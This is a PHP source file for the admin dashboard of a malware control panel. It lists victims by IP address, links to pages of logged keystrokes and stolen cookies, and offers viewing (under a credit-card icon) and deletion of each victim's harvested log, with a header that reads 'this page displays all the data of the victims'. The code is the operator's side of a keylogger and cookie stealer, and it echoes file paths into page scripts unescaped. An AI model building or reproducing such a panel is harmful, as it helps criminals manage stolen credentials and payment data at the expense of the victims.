<?php
session_start();
if (!isset($_SESSION['logged_in']) 
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title> Web Panel</title>


    <script src="css/bootstrap/js/jquery-3.4.1.min.js"></script>
    <script src="css/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="css/bootstrap/js/sweetalert.min.js"></script>
    <link href="css/icons.css" rel="stylesheet">
    <link href="css/ubuntu.css" rel="stylesheet"> 

	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
     <!-- MORRIS CHART STYLES-->
    <link href="assets/js/morris/morris-0.4.3.min.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
</head>
<body>

   <?php
    // Get dirs
    function get_dirs($dir = '') {
        return array_filter(glob('dashboard/' . $dir . '*'), 'is_dir');
    }
    // Get log files in dir
    function get_files($dir = '') {
        return array_filter(glob($dir . '*.html'), 'is_file');
    }
    ?>
  
   <style type="text/css">
        .i {
            position: relative;
            top: 5px;
        }
        .sinfo:hover {
            color: #f00;
            cursor: pointer;
        }
        .skeylogs:hover {
            color: #f00;
            cursor: pointer;
        }
        .rlogs:hover {
            color: #f00;
            cursor: pointer;
        }
    </style>

    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="index.php"> Admin Panel</a> 
            </div>
  <div style="color: white;
padding: 15px 50px 5px 50px;
float: right;
font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">Logout</a> </div>
        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                     <li>
                        <a class="active-menu"  href="index.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard</a>
                    </li>
                     <li>
                        <a  href="keyboard.php"><i class="fa fa-desktop fa-3x"></i>Keyboard</a>
                    </li>

                    <li  >
                        <a  href="cookies.php"><i class="fa fa-table fa-3x"></i>Cookies</a>
                    </li> 

                  
                    
                </ul>
               
            </div>
            
        </nav>  

        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-md-12">
                     <h2>Welcom Admin Panel 
 

                     </h2>   
                      
                    </div>
                </div>

                              
            <div class="row">
                <div class="col-md-12">
                    <!-- Advanced Tables -->
                    <div class="panel panel-default">
                        <div class="panel-heading">
                             this page displays all the data of the victims                       </div>
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover" id="Keystrokes">  

<script type="text/javascript">
        // Read info
        
        // Remove log file
        function remove_log(log, row, callback) {
            swal({
              title: "Are you sure?",
              text: "Delete log file?\n" + log,
              icon: "warning",
              buttons: true
            }).then((result) => {
              if (result) {
                // Delete file
                var http   = new XMLHttpRequest();
                var params = "log_file=" + log + "&cleanLogs";
                http.open("POST", "remove1.php", true);

                http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                http.send(params);
                // Message
                swal(
                  "Deleted!",
                  "Your file has been deleted.",
                  "success"
                );
                // Hide
                $(row).parent().parent().hide(1000);
              }
                 });
        }
        
    </script>
    
<tbody>
  <!-- TABLE -->
  <table class="table table-dark table-hover" id="logsTable" style="margin-top: 3%;">
    <thead>
      <tr style="font-family: 'Ubuntu', sans-serif;">
        <th scope="col"> <i class="i material-icons">router</i> Host</th>
        <th> </th>
        <th> </th>
        <th scope="col"> <i class="i material-icons">settings</i> Settings</th>
      </tr>
    </thead>
    <tbody>

<?php
  // Get logs  
      foreach(glob('dashboard/*.html') as $file){ 
        $remote_ip =explode("/", $file)[1]; 
   // show log data
        echo "
        <tr>
          <td>$remote_ip</td>
          <td></td>
          <td></td>
           <td>
            <i title='Show information' class='sinfo material-icons' onclick=\"window.open('$file ','newwindow', 'width=700,height=700');return false;\">credit_card</i>
            <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$file', this);\">delete_forever</i>
          </td>
        </tr>";
      }
  ?>
    </tbody>
  </table>
</thead>

</body>
</html>
                   
         <!-- /. PAGE WRAPPER  -->
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
     <!-- DATA TABLE SCRIPTS -->
    <script src="assets/js/dataTables/jquery.dataTables.js"></script>
    <script src="assets/js/dataTables/dataTables.bootstrap.js"></script>
        <script>
            $(document).ready(function () {
                $('#Keystrokes').dataTable();
            });
    </script>
         <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
    
   
</body>
</html>